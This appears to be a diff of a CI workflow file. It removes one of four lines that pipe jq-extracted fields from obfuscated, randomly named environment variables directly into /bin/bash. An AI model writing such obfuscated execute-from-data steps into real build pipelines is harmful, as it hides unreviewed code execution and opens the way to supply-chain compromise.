@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$ktf94251" | jq -r .c53573 | /bin/bash
           printf '%s' "$bt915" | jq -r .fsckh27 | /bin/bash
           echo $uzxig0 | jq -r .jq94764 | /bin/bash
-          echo $pljw5875 | jq -r .s30759 | /bin/bash
 
       - name: Upload results
         if: always()
